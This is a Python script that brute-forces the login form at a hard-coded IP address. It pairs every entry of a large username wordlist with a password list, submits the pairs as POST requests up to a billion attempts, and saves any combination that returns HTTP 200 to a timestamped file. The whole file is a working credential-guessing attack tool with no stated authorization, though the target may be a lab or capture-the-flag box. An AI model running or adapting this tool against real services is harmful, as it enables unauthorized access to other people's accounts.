import requests
from bs4 import BeautifulSoup
import os
from datetime import datetime
import time
import http.client  # Import the http module
import urllib3  # Import the urllib3 module

# Get the directory where the Python script is located
script_directory = os.path.dirname(os.path.abspath(__file__))

# URL of the page
url = "http://54.206.178.157:8084/classified.html"

# Path to the file containing usernames in the same directory as the script
usernames_filename = "xato-net-10-million-usernames-dup.txt"
usernames_file_path = os.path.join(script_directory, usernames_filename)

# Path to the file containing passwords in the same directory as the script
passwords_filename = "passwords.txt"
passwords_file_path = os.path.join(script_directory, passwords_filename)

# Define the subdirectory path for output files
output_subdirectory = "Output"
output_directory = os.path.join(script_directory, output_subdirectory)

# Create a session
session = requests.Session()

# Send a GET request to the page to get cookies
response = session.get(url)
response.raise_for_status()  # Check for any errors

# Parse the HTML content
soup = BeautifulSoup(response.content, "html.parser")

# Find the form
login_form = soup.find("form")

# Extract form action and other input fields
action = login_form["action"]
inputs = login_form.find_all("input")

# Create the output subdirectory if it doesn't exist
os.makedirs(output_directory, exist_ok=True)

# Define the output filename
current_time = datetime.now().strftime("%d%m%Y%H%M")
output_filename = os.path.join(output_directory, f"{current_time}.txt")

# Initialize attempt number
attempt_number = 0

# Limit total number of attempts
max_attempts = 1000000000

# Read usernames from the file
with open(usernames_file_path, "r") as usernames_file:
    usernames = usernames_file.read().splitlines()

# Read passwords from the file
with open(passwords_file_path, "r") as passwords_file:
    passwords = passwords_file.read().splitlines()

# Iterate through usernames and passwords to attempt to login
for username in usernames:
    if attempt_number >= max_attempts:
        print(f"Reached maximum attempts ({max_attempts}). Stopping.")
        break
    
    for password in passwords:
        # Increment attempt number
        attempt_number += 1
        
        # Prepare form data with credentials
        form_data = {
            input_.get("name"): input_.get("value", "")
            for input_ in inputs
        }

        form_data["username"] = username
        form_data["password"] = password
        
        try:
            # Send a POST request to login
            login_response = session.post(url, data=form_data)
            
            if login_response.status_code == 200:
                print(f"Attempt {attempt_number}: Successfully logged in with username: {username} and password: {password} : Status Code: {login_response.status_code}")
                
                # Write the successful combination to the output file
                with open(output_filename, "a") as output_file:
                    output_file.write(f"Username: {username}, Password: {password}\n")
                
                # Break the loop if you want to stop after the first successful login
                break
            else:
                print(f"Attempt {attempt_number}: Login failed for username: {username} and password: {password} : Status Code: {login_response.status_code}")
        
        except (requests.exceptions.ConnectionError, http.client.RemoteDisconnected, urllib3.exceptions.ProtocolError) as e:
            print(f"Attempt {attempt_number}: Connection error occurred: {e}. Continuing...")
        
        except requests.exceptions.ChunkedEncodingError as e:
            print(f"Attempt {attempt_number}: ChunkedEncodingError occurred: {e}. Continuing...")
            
        # Introduce a delay of 1 second between requests
        time.sleep(0.5)
